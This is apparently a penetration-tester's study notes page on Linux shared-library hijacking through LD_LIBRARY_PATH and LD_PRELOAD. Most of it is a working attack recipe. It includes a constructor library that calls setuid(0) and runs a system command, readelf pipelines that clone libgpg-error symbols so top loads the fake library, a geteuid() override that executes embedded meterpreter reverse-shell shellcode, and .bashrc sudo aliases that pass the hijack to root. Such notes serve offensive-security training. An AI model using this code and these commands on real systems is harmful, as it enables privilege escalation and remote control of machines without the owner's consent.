---
layout:     post
author:     0x5c4r3
type: docs
permalink: Linux_Shared_Libraries
---


<span style="font-size: 35px; color:red"><b>Shared Libraries - LD_LIBRARY_PATH</b></span>
&nbsp;

Like DLLs on windows, but on linux.
This shared libs are in the following folders (ordered by importance):
- RPATH
- LD_LIBRARY_PATH
- RUNPATH
- <span style="color:red">/etc/ld.so.conf
- <span style="color:red">/lib</span>, <span style="color:red">/lib64</span>, <span style="color:red">/usr/lib</span>, <span style="color:red">/usr/lib64</span>, <span style="color:red">/usr/local/lib</span>, <span style="color:red">/usr/local/lib64</span>, and potentially others.

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>LD_LIBRARY_PATH</b></span>

Code to insert in .bashrc or .bash_profile to define the LD_LIBRARY_PATH

I.E. the target system is running <span style="color:red">top</span> each 3 minutes. <span style="color:red">top</span> uses shared libraries. We can trick the system into loading a fake shared library containing an exploit developed by us.

0) <span style="color:red">On most modern systems, user environment variables are not passed on when using sudo. This setting is configured in the /etc/sudoers file by using the _env_reset_ keyword as a default. Some systems are configured to allow a user's environment to be passed on to sudo. These will have _env_keep_ set instead.</span> To solve this, set an alias in .bashrc  alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib" and remember to use source. Also try alias sudo = 'sudo -E' if not working.

1) Exploit to build to create shared library with payload:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow; //change these lines with the ones found in point 5
int gpgrt_feof_unlocked;

void runmahpayload() {
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");     //actual exploit
    system("touch /tmp/haxso.txt");
}
```

2) To compile:
```shell
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -o libhax.so hax.o
```
This will produce <span style="color:red">libhax.so</span>

3) To check the libraries loaded by <span style="color:red">top</span>:
```shell
ldd /usr/bin/top
```
Check what libraries you see and chose one that might not prevent normal use of the application.

4) Set the environment variable and set the name of the exploit library to the one we want to hijack:
```shell
export LD_LIBRARY_PATH=/home/offsec/ldlib/
cp libhax.so libgpg-error.so.0 (in folder specified above!)
```

5) Find missing symbols (replace <span style="color:red">libgpg-error.so.0</span> with the library you are replacing):
```shell
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
and copy output to the exploit shown in point 1.

6) It might be that we still miss some symbols (based on the output error from running <span style="color:red">top</spen>), you can find them like so:
```shell
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
You can wrap the symbols into a symbol map file (<span style="color:red">gpg.map</span>) like this:
```
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;
			//remember to add white line here
};
```

And compile everything again like so:
```shell
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

7) If not specifying the new Library path on the .bashrc/.bash_profile files, remember to export the library path: <span style="color:red">export LD_LIBRARY_PATH=/home/offsec/ldlib/</span> and run the command. To run it with <span style="color:red">sudo</span>, check point 0.

&nbsp;

---
&nbsp;

<span style="font-size: 25px; color:white"><b>Shared Libraries - LD_PRELOAD</b></span>

I.E Let's attack <span style="color:red">cp</span>.

1) <span style="color:red">ltrace cp</span> to see the various functions used by cp and find one that is used only once and possibly without input parameters. We'll redefine that function.
2) If the function that we found is - for instance - <span style="color:red">geteuid()</span>, the .c exploit is the following:
```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = "\x48\x31\xff\x6...  //c meterpreter revshell

uid_t geteuid(void)
{
	typeof(geteuid) *old_geteuid;
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if (fork() == 0)
	        {
	                intptr_t pagesize = sysconf(_SC_PAGESIZE);
	                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
	                 pagesize, PROT_READ|PROT_EXEC)) {
	                        perror("mprotect");
	                        return -1;
	                }
	                int (*ret)() = (int(*)())buf;
	                ret();
	        }
	        else
	        {
	                printf("HACK: returning from function...\n");
	                return (*old_geteuid)();
	        }
	        printf("HACK: Returning from main...\n");
	        return -2;
}
```

3) Compile it like:
```shell
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

4) After opening a meterpreter shell, test the executable like so (before and after loading library, as shown below):
```shell
cp /etc/passwd /tmp/testpasswd
export LD_PRELOAD=/home/offsec/evil_geteuid.so
cp /etc/passwd /tmp/testpasswd
```

5) To run as root:
```shell
unset LD_PRELOAD
```
Also add to .bashrc:
```shell
alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"
```
and run the command with sudo.
